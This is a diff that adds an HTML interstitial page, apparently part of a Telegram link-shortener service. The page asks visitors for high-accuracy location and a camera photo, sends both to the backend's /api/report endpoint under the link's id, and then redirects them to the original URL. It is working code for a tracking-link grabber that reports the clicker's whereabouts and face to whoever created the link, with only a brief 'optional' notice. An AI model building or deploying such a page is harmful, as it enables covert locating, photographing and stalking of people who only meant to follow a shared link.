@@ -1,0 +1,156 @@
+<!doctype html>
+<html>
+<head>
+  <meta charset="utf-8"/>
+  <meta name="viewport" content="width=device-width,initial-scale=1"/>
+  <title>Link Consent</title>
+  <style>
+    body { font-family: system-ui, -apple-system, "Segoe UI", Roboto, Arial; padding: 20px; max-width: 700px; margin: auto; }
+    button { padding: 10px 14px; margin: 8px 0; }
+    #status { margin-top: 12px; white-space: pre-wrap; }
+    video { max-width: 100%; }
+    img { max-width: 100%; }
+  </style>
+</head>
+<body>
+  <h1>Confirm & Share</h1>
+  <p>This page will ask for permission to access your location and camera. These are optional — choose what you want to share. After sharing, you'll be redirected to the original destination.</p>
+
+  <div id="ui">
+    <p id="message">Loading...</p>
+
+    <button id="get-loc">Share Location (optional)</button><br/>
+    <button id="open-camera">Take Photo (optional)</button><br/>
+    <button id="send-and-go">Send & Continue</button>
+
+    <div id="preview"></div>
+    <div id="status"></div>
+  </div>
+
+  <script>
+    const backendBase = 'https://YOUR_BACKEND_URL'; // <-- replace with your backend domain (Render/Railway)
+    // e.g. https://my-tg-shortener.onrender.com
+
+    function qs(key){
+      const params = new URLSearchParams(window.location.search);
+      return params.get(key);
+    }
+
+    const id = qs('id');
+    const messageEl = document.getElementById('message');
+    const statusEl = document.getElementById('status');
+    const previewEl = document.getElementById('preview');
+
+    let originalUrl = null;
+    let locationData = null;
+    let photoBlob = null;
+
+    if (!id) {
+      messageEl.textContent = 'Missing id in query string.';
+      document.getElementById('ui').style.display = 'none';
+    } else {
+      // fetch original
+      fetch(`${backendBase}/api/original/${encodeURIComponent(id)}`)
+        .then(r => {
+          if (!r.ok) throw new Error('Link not found');
+          return r.json();
+        })
+        .then(data => {
+          originalUrl = data.url;
+          messageEl.textContent = `Ready to share. You will be redirected to: ${originalUrl}`;
+        })
+        .catch(err => {
+          messageEl.textContent = 'Invalid or expired link.';
+          console.error(err);
+          document.getElementById('ui').style.display = 'none';
+        });
+    }
+
+    document.getElementById('get-loc').addEventListener('click', () => {
+      if (!navigator.geolocation) {
+        alert('Geolocation not supported');
+        return;
+      }
+      statusEl.textContent = 'Requesting location...';
+      navigator.geolocation.getCurrentPosition(pos => {
+        locationData = { lat: pos.coords.latitude, lon: pos.coords.longitude };
+        statusEl.textContent = `Location captured: ${locationData.lat}, ${locationData.lon}`;
+      }, err => {
+        statusEl.textContent = 'Location permission denied or error.';
+      }, { enableHighAccuracy: true, timeout: 10000 });
+    });
+
+    // camera capture
+    document.getElementById('open-camera').addEventListener('click', async () => {
+      previewEl.innerHTML = '';
+      const video = document.createElement('video');
+      video.setAttribute('autoplay', true);
+      video.setAttribute('playsinline', true);
+      previewEl.appendChild(video);
+
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        video.srcObject = stream;
+
+        const snapBtn = document.createElement('button');
+        snapBtn.textContent = 'Capture Photo';
+        previewEl.appendChild(snapBtn);
+
+        snapBtn.addEventListener('click', async () => {
+          const canvas = document.createElement('canvas');
+          canvas.width = video.videoWidth || 640;
+          canvas.height = video.videoHeight || 480;
+          const ctx = canvas.getContext('2d');
+          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+          canvas.toBlob(blob => {
+            photoBlob = blob;
+            // show preview
+            const img = document.createElement('img');
+            img.src = URL.createObjectURL(blob);
+            previewEl.innerHTML = '';
+            previewEl.appendChild(img);
+            // stop stream
+            stream.getTracks().forEach(t => t.stop());
+          }, 'image/jpeg', 0.85);
+        });
+      } catch (err) {
+        console.error(err);
+        statusEl.textContent = 'Camera permission denied or error.';
+      }
+    });
+
+    // send and redirect
+    document.getElementById('send-and-go').addEventListener('click', async () => {
+      if (!originalUrl) {
+        alert('Original URL not loaded.');
+        return;
+      }
+      statusEl.textContent = 'Sending data...';
+
+      const form = new FormData();
+      if (locationData) {
+        form.append('lat', locationData.lat);
+        form.append('lon', locationData.lon);
+      }
+      form.append('timestamp', new Date().toISOString());
+      if (photoBlob) form.append('photo', photoBlob, 'photo.jpg');
+
+      try {
+        const r = await fetch(`${backendBase}/api/report/${encodeURIComponent(id)}`, {
+          method: 'POST',
+          body: form
+        });
+        const json = await r.json();
+        statusEl.textContent = 'Sent. Redirecting...';
+        // redirect to original (either from backend response or from originalUrl variable)
+        const dest = (json && json.url) ? json.url : originalUrl;
+        window.location.href = dest;
+      } catch (err) {
+        console.error(err);
+        statusEl.textContent = 'Failed to send report. Redirecting anyway...';
+        window.location.href = originalUrl;
+      }
+    });
+  </script>
+</body>
+</html>
